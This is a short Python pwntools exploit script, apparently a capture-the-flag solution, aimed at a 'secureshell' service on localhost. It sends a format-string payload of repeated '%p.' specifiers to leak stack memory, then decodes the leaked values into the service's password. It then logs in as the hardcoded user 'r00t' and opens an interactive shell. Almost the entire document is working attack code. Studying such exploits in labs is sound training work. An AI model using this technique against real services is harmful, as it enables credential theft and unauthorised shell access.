#!/usr/bin/env python2
from pwn import *

FNAME = './secureshell'
HOST = '127.0.0.1'
PORT = '7100'
REMOTE = True

def getp():
    if REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process([FNAME])
    return p


# Username can be found from reversing (it's hardcoded)
username = 'r00t'

# Leak password
p = getp()
p.recvuntil('Username: ')

payload = ''
payload += '%p.'*46
p.sendline(payload)

p.recvuntil('Invalid Username: ')

ret = p.recvall()

# Extract password from leaked values on the stack
addrs = ret.split('.')
addrs = addrs[7:] # skip the first 7 addresses

password = ''
for addr in addrs:
    # Check if null byte
    if 'nil' in addr:
        break
    # Remove '0x' from string
    addr = addr.replace('0x', '')
    # Decode hex -> ascii string
    password_part = addr.decode('hex')
    # now reverse the bytes
    password_part = password_part[::-1]
    password += password_part

log.info('Password: %s' % password)


# Now that we have the password, reconnect for the shell
p = getp()

# Username
p.recvuntil('Username: ')
p.sendline(username)

# Password
p.recvuntil('Password: ')
p.sendline(password)

p.interactive()
